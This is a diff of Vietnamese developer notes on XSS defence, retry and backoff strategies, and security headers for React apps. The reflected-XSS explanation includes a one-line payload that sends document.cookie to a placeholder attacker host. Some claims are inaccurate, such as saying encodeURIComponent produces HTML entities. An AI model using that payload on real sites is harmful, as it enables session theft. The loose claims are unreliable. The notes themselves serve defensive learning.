@@ -2,6 +2,7 @@
 ->*** Cách tránh khi input của người dùng hiển thị trên UI:
 - Dùng textContent thay vì innerHTML là xong. innerHTML có thể bị XSS nên React đã đổi thành dangerouslySetInnerHTML, k nên dùng. 
 - Input nhét vào url phải dùng encodeURIComponent để chuyển ký tự đặc biệt thành html entity trước là xong.
+- Dùng thư viện chống XSS phía server: validator, express-validator, DOMPurify. Bản chất nó sẽ validate regexp email, sanitize string, convert sang html entities.
 
 -> Reflected XSS: User login web có session cookies -> Hacker gửi 1 URL tới trang web đó nhưng tham số có chứa mã XSS -> người dùng truy cập vào URL đó thì gửi request tới server với mã XSS của hacker -> server xử lý và trả lại ngừoi dùng hiển thị ra màn hình. VD đoạn mã là: var i=new Image; i.src=”http://hacker-site.net/”+document.cookie; -> Browser hiển thị ra màn hình sẽ thực hiện script và gửi session cookie cho hacker.
 
@@ -63,8 +64,9 @@ Có thể implement thêm safe triangle thì chuột bị di chậm hoặc đứ
 # Dùng retryable
 BE nên dùng retryable khi call api qtr và db, đặc biệt là call by batch.
 BE call tới db cũng nên tận dùng transaction để gom batch update 1 lần.
-FE ít khi dùng retryable vì ít khi lỗi mạng, mà nếu lỗi thì call lại cũng khó thành công, thường sẽ show lỗi cho người dùng. FE chỉ nên dùng cho các API quan trọng gọi tới bên thứ 3, khi polling liên tục, khi dùng socket muốn reconnect khi mất kết nối. 
-FE retryable thường triển khai qua interceptors của axios.
+FE ít khi dùng retryable, mà nếu lỗi thì call lại cũng khó thành công, thường sẽ show lỗi cho người dùng. FE chỉ nên dùng cho các API quan trọng gọi tới bên thứ 3, khi polling liên tục, khi dùng socket muốn reconnect khi mất kết nối. Rút exp là k retry khi lỗi mạng vì lỗi mạng là mất mạng thì retry làm gì, VD lỗi server trả hết access token thì retry.
+FE retryable thường triển khai qua interceptors của axios
+FE retryable triển khai qua fetch thì cứ check response.ok là error của server, try catch throw khi bị error network, invalid input from client, cors thì check lỗi network thôi.
 
 Nên giới hạn retry 3s max 5 lần. Chưa tốt vì nếu nhiều người dùng cùng lúc, tự dưng sập và mọi request tại thời điểm đó bị lỗi và retry đồng thời mỗi 3s, thì kể từ đó, mỗi 3s thì số lượng request trùng lặp dần tăng lên trong 5 lần kế.
 Giải pháp là cộng thêm 1 số random ở mỗi lần để sleep. Chưa tốt vì ktg ngắn thì xs lặp lại lỗi cũ cao, phải dùng exponential backoff là các lần sau request sẽ phải chờ lâu hơn các lần trước. VD khi nhập mật khẩu, nhập sai càng nhiều sẽ chờ càng lâu hơn lần trước đó.
@@ -131,10 +133,11 @@ Trong 1 file component có: propsType  defaultProps  utilities  Component
 Giả sử công ty lớn cần thêm các header bảo mật khi người dùng vào web react, có thể dựng 1 server nodejs custom để serve.
 Đầu tiên build app react set outDir ra 1 thư mục có file index.html -> dựng 1 server expressjs config route để serve file index.html đó -> Tuỳ ý tạo middleware thêm các header bảo mật. Có thể tạo các biến số trong file index.html để thế vào từ server, VD các url phân tách môi trường, SSL key, login SSO -> thay lệnh chạy react bằng lệnh chạy nodejs.
 Có thể dựng nginx để set header.
-Chú ý họ chỉ cần thêm header bảo mật của request lấy file index.html. Còn các API query data thì k cần, API đó có access token bảo mật riêng klq. Khi ta set header cho query GET index.html, browser lấy xong index.html này sẽ lấy các file js, css liên quan thì sẽ tự thêm các header cũ
+Chú ý họ chỉ cần thêm header bảo mật của request lấy file index.html. Còn các API query data thì k cần, API đó có access token bảo mật riêng klq. Khi ta set header cho query GET index.html, browser lấy xong index.html này sẽ lấy các file js, css liên quan thì sẽ tự thêm các header cũ mà k cần xử lý gì thêm.
 
 Thêm từ BE: res.setHeader trong middleware, package helmet, nginx
-Thêm từ FE: <meta http-equiv="Content-Security-Policy" content="default-src 'self'">
+Thêm từ FE: <meta http-equiv="Content-Security-Policy" content="default-src 'self'"> => chỉ có tác dụng sau khi html được tải
+VD Nếu web dùng CDN thì phải mở thêm quyền: <meta http-equiv="Content-Security-Policy" content="default-src 'self' https://fonts.googleapis.com https://cdn.jsdelivr.net">
 
 
 
